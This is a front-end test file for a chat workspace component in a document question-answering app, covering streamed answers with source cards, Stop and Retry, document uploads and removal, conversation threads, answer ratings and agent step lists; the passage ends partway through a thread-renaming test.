import { describe, it, expect, vi, beforeEach } from 'vitest'
import { act, render, screen, within } from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import { MemoryRouter, Route, Routes, useLocation } from 'react-router'
import ChatLayout from './ChatLayout'
import { AuthProvider } from '../../services/AuthContext'
import * as api from '../../services/api'
import { version } from '../../../package.json'
import snapshot from '../../../../backend/tests/openapi_snapshot.json'
import { chatReply, documentList, documentRecord, documentStatus, done, session, SOURCE, turn } from '../../test/fixtures'

vi.mock('../../services/api', async (importOriginal) => ({
  ...(await importOriginal()),
  getDocumentsDetailed: vi.fn(),
  getDocument: vi.fn(),
  deleteDocument: vi.fn(),
  sendChatStream: vi.fn(),
  sendChat: vi.fn(),
  sendFeedback: vi.fn(),
  uploadDocument: vi.fn(),
  clearSession: vi.fn(),
  getSessions: vi.fn(),
  getSessionMessages: vi.fn(),
  renameSession: vi.fn(),
  deleteSession: vi.fn(),
}))

/** Shows the current path, so a test can read the URL the workspace navigated to. */
function Where() {
  return <output data-testid="where">{useLocation().pathname}</output>
}

/** The workspace at a path, mounted once for every workspace path as in the app. */
function renderChat(path = '/chat/session_1') {
  const addToast = vi.fn()
  render(
    <MemoryRouter initialEntries={[path]}>
      <AuthProvider>
        <Routes>
          <Route path="*" element={<><ChatLayout addToast={addToast} /><Where /></>} />
        </Routes>
      </AuthProvider>
    </MemoryRouter>,
  )
  return { addToast }
}

const where = () => screen.getByTestId('where').textContent

async function ask(question: string) {
  const user = userEvent.setup()
  await user.type(screen.getByPlaceholderText(/ask anything/i), `${question}{Enter}`)
  return user
}

describe('ChatLayout', () => {
  beforeEach(() => {
    vi.mocked(api.getDocumentsDetailed).mockReset()
    vi.mocked(api.getDocumentsDetailed).mockResolvedValue(documentList([documentRecord({ id: 7, filename: 'zephyr_manual.txt' })]))
    vi.mocked(api.deleteDocument).mockReset()
    vi.mocked(api.sendChatStream).mockReset()
    vi.mocked(api.clearSession).mockReset()
    vi.mocked(api.getSessions).mockReset()
    vi.mocked(api.getSessions).mockResolvedValue({ sessions: [] })
    vi.mocked(api.getSessionMessages).mockReset()
    vi.mocked(api.getSessionMessages).mockImplementation(async (id) => ({ session_id: id, turns: [] }))
  })

  it('sends a question and shows the streamed answer with its source card', async () => {
    vi.mocked(api.sendChatStream).mockImplementation(async ({ onToken, onDone }) => {
      onToken?.('The blades are inspected ')
      onToken?.('**every 90 days**.')
      onDone?.(done({ sources: [SOURCE], confidence: 0.81 }))
    })
    renderChat()
    expect(await screen.findAllByText('zephyr_manual.txt')).not.toHaveLength(0)  // sidebar document list

    const user = await ask('How often are the blades inspected?')

    expect(api.sendChatStream).toHaveBeenCalledTimes(1)
    expect(vi.mocked(api.sendChatStream).mock.calls[0][0]).toMatchObject({
      question: 'How often are the blades inspected?', mode: 'default',
    })
    expect(screen.getByText('How often are the blades inspected?')).toBeTruthy()

    // The answer is rendered as Markdown
    const bold = await screen.findByText('every 90 days')
    expect(bold.tagName).toBe('STRONG')

    // One source card in the margin with file, page, score and the passage; a click pins it open
    const card = screen.getByText('Sources').parentElement as HTMLElement
    expect(within(card).getByText('zephyr_manual.txt')).toBeTruthy()
    expect(within(card).getByText('p. 1')).toBeTruthy()
    expect(within(card).getByText('0.83')).toBeTruthy()
    expect(within(card).getByText(SOURCE.snippet)).toBeTruthy()
    const source = within(card).getByRole('button')
    expect(source.getAttribute('aria-expanded')).toBe('false')
    await user.click(source)
    expect(source.getAttribute('aria-expanded')).toBe('true')

    // The composer is usable again
    expect((screen.getByPlaceholderText(/ask anything/i) as HTMLTextAreaElement).disabled).toBe(false)
  })

  it('shows what an answer cost in one line, with its stages on demand (Sprint 8, item 1)', async () => {
    vi.mocked(api.sendChatStream).mockImplementation(async ({ onToken, onDone }) => {
      onToken?.('Every 90 days.')
      onDone?.(done({
        sources: [SOURCE], confidence: 0.81, turn_id: 4,
        usage: {
          seconds: 4.23, input_tokens: 1100, output_tokens: 140,
          stages: [
            { name: 'retrieve', seconds: 0.31, input_tokens: 0, output_tokens: 0 },
            { name: 'summarize', seconds: 1.9, input_tokens: 600, output_tokens: 90 },
            { name: 'answer', seconds: 2.0, input_tokens: 500, output_tokens: 50 },
          ],
        },
      }))
    })
    renderChat()
    const user = await ask('How often are the blades inspected?')

    const line = await screen.findByText((_, el) => el?.tagName === 'SUMMARY' && el.textContent === '4.2 s, 1,240 tokens')
    const stages = screen.getByRole('list', { name: 'Stages', hidden: true })
    expect(stages.closest('details')?.open).toBe(false)
    await user.click(line)
    expect(stages.closest('details')?.open).toBe(true)
    expect(within(stages).getAllByRole('listitem').map((li) => li.textContent)).toEqual([
      'Search0.3 sno model call', 'Summary1.9 s600 in, 90 out', 'Answer2.0 s500 in, 50 out',
    ])
  })

  it('shows no cost line for an answer read back from the server', async () => {
    vi.mocked(api.getSessionMessages).mockResolvedValue({
      session_id: 'session_1', turns: [turn({ turn_id: 3, question: 'Earlier?', answer: 'Yes.', sources: [SOURCE] })],
    })
    renderChat()
    expect(await screen.findByText('Yes.')).toBeTruthy()
    expect(document.querySelector('.x-usage')).toBeNull()
  })

  it('shows a stream error with Retry, keeps no partial answer, and puts the question back in the composer', async () => {
    // Decision 11 replaced the error toast with this: the question is not lost
    vi.mocked(api.sendChatStream).mockImplementation(async ({ onToken, onError }) => {
      onToken?.('Half an ')
      onError?.(new Error('The connection closed before the answer was complete. Please try again.'))
    })
    const { addToast } = renderChat()
    const user = await ask('Will this fail?')

    const alert = screen.getByRole('alert')
    expect(alert.textContent).toBe('Failed. The connection closed before the answer was complete. Please try again.Retry')
    expect(addToast).not.toHaveBeenCalled()
    expect(screen.queryByText(/Half an/)).toBeNull()
    expect(screen.queryByText('Sources')).toBeNull()
    expect(screen.queryByRole('heading', { name: 'Will this fail?' })).toBeNull()  // the server saved no turn
    const composer = screen.getByPlaceholderText(/ask anything/i) as HTMLTextAreaElement
    expect(composer.disabled).toBe(false)
    expect(composer.value).toBe('Will this fail?')

    // Retry asks the same question again, in the same thread
    vi.mocked(api.sendChatStream).mockImplementation(async ({ onToken, onDone }) => {
      onToken?.('It worked this time.')
      onDone?.(done({ turn_id: 8 }))
    })
    await user.click(within(alert).getByRole('button', { name: 'Retry' }))
    expect(await screen.findByText('It worked this time.')).toBeTruthy()
    expect(screen.getByRole('heading', { name: 'Will this fail?' })).toBeTruthy()
    expect(vi.mocked(api.sendChatStream).mock.calls[1][0]).toMatchObject({ question: 'Will this fail?', sessionId: 'session_1' })
    expect(screen.queryByRole('alert')).toBeNull()
    expect(composer.value).toBe('')
  })

  it('Stop closes the stream, saves nothing, and puts the question back with Retry', async () => {
    // The fake stream ends the way fetch does when its signal is aborted
    vi.mocked(api.sendChatStream).mockImplementation(({ onToken, onError, signal }) => new Promise<void>((resolve) => {
      onToken?.('The first words ')
      signal?.addEventListener('abort', () => {
        onError?.(new DOMException('The user aborted a request.', 'AbortError'))
        resolve()
      })
    }))
    renderChat()
    const user = await ask('A long question')
    // Streamed words arrive one span each
    await vi.waitFor(() => expect(document.querySelector('[aria-busy="true"]')?.textContent).toContain('The first words'))

    await user.click(screen.getByRole('button', { name: 'Stop generating' }))
    expect(vi.mocked(api.sendChatStream).mock.calls[0][0].signal?.aborted).toBe(true)
    expect(screen.getByRole('alert').textContent).toContain('Stopped. Your question is back in the box below. Nothing was saved.')
    expect(document.body.textContent).not.toContain('The first words')
    expect(screen.queryByRole('heading', { name: 'A long question' })).toBeNull()
    expect((screen.getByPlaceholderText(/ask anything/i) as HTMLTextAreaElement).value).toBe('A long question')
    expect(screen.getByRole('button', { name: 'Retry' })).toBeTruthy()
  })

  it('cannot stop an answer that is not streamed, since only closing a stream tells the server', async () => {
    let finish: (reply: ReturnType<typeof chatReply>) => void = () => {}
    vi.mocked(api.sendChat).mockImplementation(() => new Promise((resolve) => { finish = resolve }))
    renderChat()
    const user = userEvent.setup()
    await user.click(screen.getByRole('switch', { name: 'Stream' }))
    await ask('Not streamed')
    expect((screen.getByRole('button', { name: 'Stop generating' }) as HTMLButtonElement).disabled).toBe(true)
    await act(async () => finish(chatReply({ answer: 'In one piece.', turn_id: 2 })))
    expect(await screen.findByText('In one piece.')).toBeTruthy()
    expect(api.sendChatStream).not.toHaveBeenCalled()
  })

  it('streams agent answers too, so they can be stopped', async () => {
    vi.mocked(api.sendChatStream).mockImplementation(async ({ onToken, onDone }) => {
      onToken?.('Two plus two is 4.')
      onDone?.(done({ tool_used: 'calculator', confidence: null, turn_id: 3 }))
    })
    renderChat()
    const user = userEvent.setup()
    await user.click(screen.getByRole('radio', { name: 'Agent' }))
    expect((screen.getByRole('switch', { name: 'Stream' }) as HTMLButtonElement).disabled).toBe(false)
    await ask('What is 2 + 2?')
    expect(vi.mocked(api.sendChatStream).mock.calls[0][0].mode).toBe('agent')
    expect(await screen.findByText('Two plus two is 4.')).toBeTruthy()
    expect(api.sendChat).not.toHaveBeenCalled()
  })

  it('discards a reply that finishes after its thread was left, and keeps the new thread free', async () => {
    let finish: () => void = () => {}
    vi.mocked(api.sendChatStream).mockImplementationOnce(({ onToken, onDone }) => new Promise<void>((resolve) => {
      finish = () => {
        onToken?.('A late answer.')
        onDone?.(done({ turn_id: 4 }))
        resolve()
      }
    }))
    renderChat()
    const user = await ask('A slow question')
    expect(screen.getByRole('button', { name: 'Stop generating' })).toBeTruthy()

    await user.click(screen.getByRole('button', { name: 'New thread' }))
    expect(where()).not.toBe('/chat/session_1')
    // The new thread is not busy: its composer sends
    expect(screen.queryByRole('button', { name: 'Stop generating' })).toBeNull()
    const signal = vi.mocked(api.sendChatStream).mock.calls[0][0].signal
    expect(signal?.aborted).toBe(false)  // the old reply goes on; the server saves it to its own thread

    await act(async () => finish())
    expect(screen.queryByText('A late answer.')).toBeNull()
    expect(screen.queryByText('A slow question')).toBeNull()
  })

  it('passes the Hybrid mode to the request', async () => {
    vi.mocked(api.sendChatStream).mockImplementation(async ({ onDone }) => onDone?.(done()))
    renderChat()
    const user = userEvent.setup()
    // The answer mode is one radio group now, not four toggle buttons
    await user.click(screen.getByRole('radio', { name: /hybrid/i }))
    await ask('Hybrid please')
    expect(vi.mocked(api.sendChatStream).mock.calls[0][0].mode).toBe('hybrid')
  })

  it('removes one document after a second, confirming click', async () => {
    vi.mocked(api.deleteDocument).mockResolvedValue({ message: "Deleted 'zephyr_manual.txt' (1 chunks).", filename: 'zephyr_manual.txt', deleted: 1 })
    const { addToast } = renderChat()
    const user = userEvent.setup()
    const remove = await screen.findByRole('button', { name: 'Remove zephyr_manual.txt' })

    // The first click only arms the button: nothing is deleted yet
    await user.click(remove)
    expect(api.deleteDocument).not.toHaveBeenCalled()
    const confirm = screen.getByRole('button', { name: 'Confirm removing zephyr_manual.txt' })
    expect(confirm.textContent).toBe('Remove?')

    // The second click deletes it by id, says so, and reloads the library
    vi.mocked(api.getDocumentsDetailed).mockResolvedValue(documentList([]))
    await user.click(confirm)
    expect(api.deleteDocument).toHaveBeenCalledWith(7)
    expect(await screen.findByText('No documents yet')).toBeTruthy()
    expect(addToast).toHaveBeenCalledWith('Removed zephyr_manual.txt', 'info')
  })

  it('an armed remove button disarms when focus leaves it', async () => {
    renderChat()
    const user = userEvent.setup()
    await user.click(await screen.findByRole('button', { name: 'Remove zephyr_manual.txt' }))
    await user.click(screen.getByPlaceholderText(/ask anything/i))
    expect(screen.getByRole('button', { name: 'Remove zephyr_manual.txt' })).toBeTruthy()
    expect(api.deleteDocument).not.toHaveBeenCalled()
  })

  it('says so when a document cannot be removed, and keeps it listed', async () => {
    vi.mocked(api.deleteDocument).mockRejectedValue(new Error('No such document.'))
    const { addToast } = renderChat()
    const user = userEvent.setup()
    await user.click(await screen.findByRole('button', { name: 'Remove zephyr_manual.txt' }))
    await user.click(screen.getByRole('button', { name: 'Confirm removing zephyr_manual.txt' }))
    expect(addToast).toHaveBeenCalledWith('No such document.', 'error')
    expect(await screen.findByRole('button', { name: 'Remove zephyr_manual.txt' })).toBeTruthy()
  })

  it('does not send a file over the 50 MB limit, and says why', async () => {
    const { addToast } = renderChat()
    const user = userEvent.setup()
    const big = new File(['x'], 'huge.pdf', { type: 'application/pdf' })
    Object.defineProperty(big, 'size', { value: 50 * 1024 * 1024 + 1 })
    await user.upload(document.querySelector('input[type="file"]') as HTMLInputElement, big)
    expect(api.uploadDocument).not.toHaveBeenCalled()
    expect(addToast).toHaveBeenCalledWith('huge.pdf is larger than 50 MB, the most one file may be.', 'error')
  })

  it('uploads a file, waits while it is read, and says how many passages it made', async () => {
    vi.mocked(api.uploadDocument).mockResolvedValue({ document_id: 9, filename: 'plan.pdf', status: 'processing', replaces: true, message: "Reading 'plan.pdf'." })
    vi.mocked(api.getDocument).mockReset()
    vi.mocked(api.getDocument).mockResolvedValue(documentStatus({ id: 9, filename: 'plan.pdf', status: 'ready', pages: 3, chunks: 12 }))
    const { addToast } = renderChat()
    const user = userEvent.setup()
    await user.upload(document.querySelector('input[type="file"]') as HTMLInputElement, new File(['%PDF'], 'plan.pdf', { type: 'application/pdf' }))
    await vi.waitFor(() => expect(addToast).toHaveBeenCalledWith(
      'Added plan.pdf: 12 passages from 3 pages. It replaced the earlier file of that name.', 'success'))
    expect(api.getDocument).toHaveBeenCalledWith(9)
    expect(api.deleteDocument).not.toHaveBeenCalled()
  })

  it('shows why an upload could not be read, and takes it out of the library', async () => {
    vi.mocked(api.uploadDocument).mockResolvedValue({ document_id: 10, filename: 'scan.pdf', status: 'processing', replaces: false, message: "Reading 'scan.pdf'." })
    vi.mocked(api.getDocument).mockReset()
    vi.mocked(api.getDocument).mockResolvedValue(documentStatus({
      id: 10, filename: 'scan.pdf', status: 'failed', error: "'scan.pdf' has no text to read.", pages: 0, chunks: 0,
    }))
    vi.mocked(api.deleteDocument).mockResolvedValue({ message: "Deleted 'scan.pdf' (0 chunks).", filename: 'scan.pdf', deleted: 0 })
    const { addToast } = renderChat()
    const user = userEvent.setup()
    await user.upload(document.querySelector('input[type="file"]') as HTMLInputElement, new File(['%PDF'], 'scan.pdf', { type: 'application/pdf' }))
    await vi.waitFor(() => expect(addToast).toHaveBeenCalledWith("'scan.pdf' has no text to read.", 'error'))
    expect(api.deleteDocument).toHaveBeenCalledWith(10)
  })

  it('marks a document that is still being read, or could not be read, in words', async () => {
    vi.mocked(api.getDocumentsDetailed).mockResolvedValue(documentList([
      documentRecord({ id: 1, filename: 'big.pdf', status: 'processing' }),
      documentRecord({ id: 2, filename: 'bad.pdf', status: 'failed', error: 'It is damaged.' }),
      documentRecord({ id: 3, filename: 'good.pdf', status: 'ready' }),
    ]))
    renderChat()
    expect(await screen.findByText('Reading')).toBeTruthy()
    expect(screen.getByText('Could not be read').getAttribute('title')).toBe('It is damaged.')
    expect(screen.getAllByText(/Reading|Could not be read/)).toHaveLength(2)
  })

  it('opens the latest conversation at /chat, with its sources, and puts its id in the URL', async () => {
    vi.mocked(api.getSessions).mockResolvedValue({ sessions: [session({ session_id: 'session_42', title: 'How often?', turns: 1 })] })
    vi.mocked(api.getSessionMessages).mockResolvedValue({ session_id: 'session_42', turns: [turn({
      turn_id: 5, question: 'How often are the blades inspected?', answer: 'Every **90 days**.',
      sources: [SOURCE], confidence: 0.81, mode: 'original', tool_used: null, feedback: 0, created_at: '2026-10-12T10:00:00',
    })] })
    vi.mocked(api.sendChatStream).mockImplementation(async ({ onDone }) => onDone?.(done()))
    renderChat('/chat')
    expect(await screen.findByText('How often are the blades inspected?')).toBeTruthy()
    expect(where()).toBe('/chat/session_42')
    expect((await screen.findByText('90 days')).tagName).toBe('STRONG')
    expect(within(screen.getByText('Sources').parentElement as HTMLElement).getByText(SOURCE.snippet)).toBeTruthy()
    expect(screen.getByText('default mode')).toBeTruthy()
    expect(api.getSessionMessages).toHaveBeenCalledWith('session_42')

    // The next question goes on in the same conversation
    await ask('And who inspects them?')
    expect(vi.mocked(api.sendChatStream).mock.calls[0][0].sessionId).toBe('session_42')
  })

  it('starts a new thread without deleting the old one from the server', async () => {
    vi.mocked(api.sendChatStream).mockImplementation(async ({ onToken, onDone }) => {
      onToken?.('An answer.')
      onDone?.(done())
    })
    const { addToast } = renderChat()
    await ask('A first question')
    const before = vi.mocked(api.sendChatStream).mock.calls[0][0].sessionId
    expect(before).toBe('session_1')
    const user = userEvent.setup()
    await user.click(screen.getByRole('button', { name: 'New thread' }))
    expect(api.clearSession).not.toHaveBeenCalled()
    expect(where()).toMatch(/^\/chat\/session_\d+$/)
    expect(where()).not.toBe('/chat/session_1')
    expect(addToast).toHaveBeenCalledWith('New thread started', 'info')
    expect(screen.queryByText('A first question')).toBeNull()
    await ask('A second question')
    expect(vi.mocked(api.sendChatStream).mock.calls[1][0].sessionId).not.toBe(before)
    expect(where()).toBe(`/chat/${vi.mocked(api.sendChatStream).mock.calls[1][0].sessionId}`)
  })

  it('deletes the conversation from the server only when asked to in Settings', async () => {
    vi.mocked(api.clearSession).mockResolvedValue({ message: 'Session cleared', session_id: 'session_1' })
    const { addToast } = renderChat()
    const user = userEvent.setup()
    await user.click(screen.getByRole('button', { name: 'Settings' }))
    expect(where()).toBe('/settings')
    await user.click(screen.getByRole('button', { name: 'Clear conversation' }))
    expect(api.clearSession).toHaveBeenCalledTimes(1)
    expect(api.clearSession).toHaveBeenCalledWith('session_1')
    expect(addToast).toHaveBeenCalledWith('Conversation deleted', 'info')
  })

  it('says "1 passage from 1 page", not "1 passages"', async () => {
    vi.mocked(api.uploadDocument).mockResolvedValue({ document_id: 11, filename: 'note.txt', status: 'processing', replaces: false, message: "Reading 'note.txt'." })
    vi.mocked(api.getDocument).mockReset()
    vi.mocked(api.getDocument).mockResolvedValue(documentStatus({ id: 11, filename: 'note.txt', status: 'ready', pages: 1, chunks: 1 }))
    const { addToast } = renderChat()
    const user = userEvent.setup()
    await user.upload(document.querySelector('input[type="file"]') as HTMLInputElement, new File(['hi'], 'note.txt', { type: 'text/plain' }))
    await vi.waitFor(() => expect(addToast).toHaveBeenCalledWith('Added note.txt: 1 passage from 1 page.', 'success'))
  })

  it('opens settings over the open conversation, and closing it returns to that conversation', async () => {
    vi.mocked(api.getSessionMessages).mockImplementation(async (id) => ({ session_id: id, turns: [turn({
      turn_id: 3, question: 'Who logs the inspections?', answer: 'The Halcyon register.',
    })] }))
    renderChat('/chat/session_9')
    expect(await screen.findByText('Who logs the inspections?')).toBeTruthy()
    const user = userEvent.setup()
    await user.click(screen.getByRole('button', { name: 'Settings' }))
    expect(where()).toBe('/settings')
    expect(screen.getByRole('dialog', { name: 'Settings' })).toBeTruthy()
    expect(screen.getByText('Who logs the inspections?')).toBeTruthy()  // still there underneath
    await user.click(screen.getByRole('button', { name: 'Close' }))
    expect(where()).toBe('/chat/session_9')
    expect(screen.queryByRole('dialog')).toBeNull()
    expect(api.getSessionMessages).toHaveBeenCalledTimes(1)  // the conversation was not loaded again
  })

  it('at /settings opened directly, shows the sheet over the latest conversation', async () => {
    vi.mocked(api.getSessions).mockResolvedValue({ sessions: [session({ session_id: 'session_77' })] })
    renderChat('/settings')
    expect(await screen.findByRole('dialog', { name: 'Settings' })).toBeTruthy()
    await vi.waitFor(() => expect(api.getSessionMessages).toHaveBeenCalledWith('session_77'))
    expect(where()).toBe('/settings')
  })

  it('at /chat with no conversations yet, starts a new one in the URL', async () => {
    renderChat('/chat')
    await vi.waitFor(() => expect(where()).toMatch(/^\/chat\/session_\d+$/))
  })

  it('lists the conversations newest first, marks the open one, and opens another in the URL', async () => {
    vi.mocked(api.getSessions).mockResolvedValue({ sessions: [
      session({ session_id: 'session_2', title: 'Who logs the inspections?', updated_at: '2026-10-12T11:00:00' }),
      session({ session_id: 'session_1', title: 'How often are the blades inspected?', updated_at: '2026-10-11T09:30:00' }),
    ] })
    vi.mocked(api.getSessionMessages).mockImplementation(async (id) => ({ session_id: id, turns: [turn({
      turn_id: id === 'session_2' ? 2 : 1, question: `The question of ${id}`, answer: `The answer of ${id}`,
    })] }))
    renderChat('/chat/session_1')
    const list = await screen.findByRole('navigation', { name: 'Conversations' })
    const links = await within(list).findAllByRole('link')
    expect(links.map((l) => l.querySelector('.x-thread__title')?.textContent)).toEqual([
      'Who logs the inspections?', 'How often are the blades inspected?',
    ])
    expect(links.map((l) => l.getAttribute('aria-current'))).toEqual([null, 'page'])
    expect(links[0].querySelector('time')?.getAttribute('dateTime')).toBe('2026-10-12T11:00:00')
    expect(await screen.findByText('The answer of session_1')).toBeTruthy()

    await userEvent.setup().click(links[0])
    expect(where()).toBe('/chat/session_2')
    expect(await screen.findByText('The answer of session_2')).toBeTruthy()
    expect(screen.queryByText('The answer of session_1')).toBeNull()
    expect(api.getSessionMessages).toHaveBeenLastCalledWith('session_2')
    const after = within(list).getAllByRole('link')
    expect(after.map((l) => l.getAttribute('aria-current'))).toEqual(['page', null])
  })

  it('lists a new conversation once it has an answer', async () => {
    vi.mocked(api.sendChatStream).mockImplementation(async ({ onToken, onDone }) => {
      onToken?.('An answer.')
      onDone?.(done({ turn_id: 6 }))
    })
    renderChat('/chat/session_5')
    expect(await screen.findByText('No conversations yet')).toBeTruthy()
    vi.mocked(api.getSessions).mockResolvedValue({ sessions: [session({ session_id: 'session_5', title: 'A first question' })] })
    await ask('A first question')
    const list = screen.getByRole('navigation', { name: 'Conversations' })
    expect((await within(list).findByRole('link')).getAttribute('aria-current')).toBe('page')
  })

  it('rates an answer up, takes the rating back, and rates it down', async () => {
    vi.mocked(api.sendFeedback).mockReset()
    vi.mocked(api.sendFeedback).mockResolvedValue({ message: 'Feedback recorded successfully.' })
    vi.mocked(api.sendChatStream).mockImplementation(async ({ onToken, onDone }) => {
      onToken?.('Every 90 days.')
      onDone?.(done({ sources: [SOURCE], confidence: 0.8, turn_id: 21 }))
    })
    renderChat()
    const user = await ask('How often?')
    const rating = await screen.findByRole('group', { name: 'Rate this answer' })
    const up = within(rating).getByRole('button', { name: 'Helpful' })
    const down = within(rating).getByRole('button', { name: 'Not helpful' })
    expect([up, down].map((b) => b.getAttribute('aria-pressed'))).toEqual(['false', 'false'])

    await user.click(up)
    expect(api.sendFeedback).toHaveBeenLastCalledWith(21, 1)
    expect(up.getAttribute('aria-pressed')).toBe('true')

    await user.click(up)  // pressing the chosen one again clears it
    expect(api.sendFeedback).toHaveBeenLastCalledWith(21, 0)
    expect(up.getAttribute('aria-pressed')).toBe('false')

    await user.click(down)
    expect(api.sendFeedback).toHaveBeenLastCalledWith(21, -1)
    expect([up, down].map((b) => b.getAttribute('aria-pressed'))).toEqual(['false', 'true'])
  })

  it('shows the rating saved with a turn after a reload, and puts it back if a change fails', async () => {
    vi.mocked(api.sendFeedback).mockReset()
    vi.mocked(api.sendFeedback).mockRejectedValue(new Error('No such answer.'))
    vi.mocked(api.getSessionMessages).mockResolvedValue({ session_id: 'session_1', turns: [turn({
      turn_id: 5, question: 'How often?', answer: 'Every 90 days.', sources: [SOURCE], feedback: -1,
    })] })
    const { addToast } = renderChat()
    const rating = await screen.findByRole('group', { name: 'Rate this answer' })
    const down = within(rating).getByRole('button', { name: 'Not helpful' })
    expect(down.getAttribute('aria-pressed')).toBe('true')

    await userEvent.setup().click(within(rating).getByRole('button', { name: 'Helpful' }))
    expect(api.sendFeedback).toHaveBeenCalledWith(5, 1)
    await vi.waitFor(() => expect(addToast).toHaveBeenCalledWith('No such answer.', 'error'))
    expect(down.getAttribute('aria-pressed')).toBe('true')
    expect(within(rating).getByRole('button', { name: 'Helpful' }).getAttribute('aria-pressed')).toBe('false')
  })

  it('offers no rating for an answer the server did not save', async () => {
    vi.mocked(api.sendChatStream).mockImplementation(async ({ onToken, onDone }) => {
      onToken?.('I could not find relevant information in the uploaded documents to answer that question.')
      onDone?.(done({ turn_id: null }))
    })
    renderChat()
    await ask('Something unrelated')
    expect(await screen.findByText(/I could not find relevant information/)).toBeTruthy()
    expect(screen.queryByRole('group', { name: 'Rate this answer' })).toBeNull()
  })

  it('ties each cited [n] to source card n, by pointer and by keyboard, when sources are numbered', async () => {
    // The server's AETHER_ANSWER_FROM=chunks mode: the sources are the cited chunks, each with its number
    const register = { source: 'halcyon_register.xlsx', page: 2, score: 0.71, snippet: 'Inspection HR-2291 · Team Orion.', number: 3 }
    vi.mocked(api.sendChatStream).mockImplementation(async ({ onToken, onDone }) => {
      onToken?.('Blades are inspected every 90 days [1]. Each inspection is logged [3]; see `[1]` and [7].')
      onDone?.(done({ sources: [{ ...SOURCE, number: 1 }, register], confidence: 0.8, turn_id: 30 }))
    })
    renderChat()
    const user = await ask('How are inspections handled?')

    const first = await screen.findByRole('button', { name: 'Source 1: zephyr_manual.txt, page 1' })
    const third = screen.getByRole('button', { name: 'Source 3: halcyon_register.xlsx, page 2' })
    expect(screen.getAllByRole('button', { name: /^Source \d/ })).toHaveLength(2)
    // A number no source has, and a marker inside code, stay as written
    const answer = first.closest('.p-answer') as HTMLElement
    expect(answer.textContent).toContain('[7]')
    expect(within(answer).getByText('[1]').tagName).toBe('CODE')

    // Cards are numbered by their citation number
    const margin = screen.getByText('Sources').parentElement as HTMLElement
    const cards = within(margin).getAllByRole('button')
    expect(cards.map((c) => c.querySelector('.p-source__n')?.textContent)).toEqual(['1', '3'])

    // Pointer: the chip lights its card, and the card lights its chip
    await user.hover(third)
    expect(cards[1].getAttribute('aria-expanded')).toBe('true')
    expect(cards[0].getAttribute('aria-expanded')).toBe('false')
    await user.unhover(third)
    expect(cards[1].getAttribute('aria-expanded')).toBe('false')
    await user.hover(cards[0])
    expect(first.getAttribute('data-active')).toBe('true')
    await user.unhover(cards[0])

    // Keyboard: focusing a chip lights its card; Enter pins the card open
    act(() => first.focus())
    expect(cards[0].getAttribute('aria-expanded')).toBe('true')
    await user.keyboard('{Enter}')
    act(() => first.blur())
    expect(cards[0].getAttribute('aria-expanded')).toBe('true')
    expect(cards[1].getAttribute('aria-expanded')).toBe('false')
  })

  it('shows an answer and its sources as written when the sources carry no number', async () => {
    vi.mocked(api.sendChatStream).mockImplementation(async ({ onToken, onDone }) => {
      onToken?.('Blades are inspected every 90 days [1].')
      onDone?.(done({ sources: [SOURCE], confidence: 0.8, turn_id: 31 }))
    })
    renderChat()
    await ask('How often?')
    expect(await screen.findByText('Blades are inspected every 90 days [1].')).toBeTruthy()
    expect(screen.queryByRole('button', { name: /^Source \d/ })).toBeNull()
    const margin = screen.getByText('Sources').parentElement as HTMLElement
    expect(within(margin).getByRole('button').querySelector('.p-source__n')?.textContent).toBe('1')
  })

  it('names the tools an agent answer used, in a labelled row', async () => {
    vi.mocked(api.sendChatStream).mockImplementation(async ({ onToken, onDone }) => {
      onToken?.('The inspection is due in 12 days.')
      onDone?.(done({ sources: [SOURCE], confidence: 0.8, tool_used: 'calculator + document_search', turn_id: 40 }))
    })
    renderChat()
    const user = userEvent.setup()
    await user.click(screen.getByRole('radio', { name: 'Agent' }))
    await ask('When is the next inspection?')
    const row = (await screen.findByText('Tools used')).parentElement as HTMLElement
    expect(row.textContent).toBe('Tools usedCalculatorDocument search')

    vi.mocked(api.sendChatStream).mockImplementation(async ({ onToken, onDone }) => {
      onToken?.('Hello.')
      onDone?.(done({ tool_used: 'agent_direct', confidence: null, turn_id: 41 }))
    })
    await ask('Hello')
    await vi.waitFor(() => expect(screen.getAllByText('Tools used')).toHaveLength(2))
    expect(screen.getByText('None: it answered directly')).toBeTruthy()
  })

  it('lists an agent answer\'s steps in order above it, in place of the tools row (Sprint 8, item 2)', async () => {
    vi.mocked(api.sendChatStream).mockImplementation(async ({ onToken, onDone }) => {
      onToken?.('The inspection is due in 12 days.')
      onDone?.(done({
        sources: [SOURCE], confidence: 0.8, tool_used: 'datetime + document_search', turn_id: 43,
        steps: [
          { tool: 'document_search', input: 'last blade inspection date', output: 'The last inspection was on 2026-07-24.' },
          { tool: 'datetime', input: '90 days after 2026-07-24', output: '90 days after 2026-07-24 is 2026-10-22.' },
        ],
      }))
    })
    renderChat()
    const user = userEvent.setup()
    await user.click(screen.getByRole('radio', { name: 'Agent' }))
    await ask('When is the next inspection?')

    const steps = await screen.findByRole('list', { name: 'Steps the agent took' })
    expect(within(steps).getAllByRole('listitem').map((li) => li.textContent)).toEqual([
      'Document searchlast blade inspection dateThe last inspection was on 2026-07-24.',
      'Date and time90 days after 2026-07-2490 days after 2026-07-24 is 2026-10-22.',
    ])
    expect(screen.queryByText('Tools used')).toBeNull()
    // Above the answer: the list comes before the answer's text in the page
    const answer = screen.getByText('The inspection is due in 12 days.')
    expect(steps.compareDocumentPosition(answer) & Node.DOCUMENT_POSITION_FOLLOWING).toBeTruthy()
  })

  it('renames a thread in place: Enter keeps the name, Escape gives up (Sprint 8, item 3)', async () => {
    let titles = { session_1: 'How often?', session_2: 'Who inspects?' }
    vi.mocked(api.getSessions).mockImplementation(async () => ({
      sessions: Object.entries(titles).map(([session_id, title]) => session({ session_id, title })),
    }))
    vi.mocked(api.renameSession).mockReset()
    vi.mocked(api.renameSession).mockImplementation(async (session_id, title) => {
      titles = { ...titles, [session_id]: title }
      return { session_id, title }
    })
    renderChat()
    const user = userEvent.setup()
    const threads = screen.getByRole('navigation', { name: 'Conversations' })
    await user.click(await within(threads).findByRole('button', { name: 'Rename Who inspects?' }))

    const field = within(threads).getByRole('textbox', { name: 'New name for Who inspects?' })
    expect(document.activeElement).toBe(field)
    await user.keyboard('{Escape}')
    expect(api.renameSession).not.toHaveBeenCalled()
    expect(within(threads).getByRole('link', { name: /Who inspects\?/ })).toBeTruthy()

    await user.click(within(threads).getByRole('button', { name: 'Rename Who inspects?' }))
    await user.clear(within(threads).getByRole('textbox', { name: 'New name for Who inspects?' }))
    await user.type(within(threads).getByRole('textbox', { name: 'New name for Who inspects?' }), 'Field team{Enter}')
    expect(api.renameSession).toHaveBeenCalledWith('session_2', 'Field team')
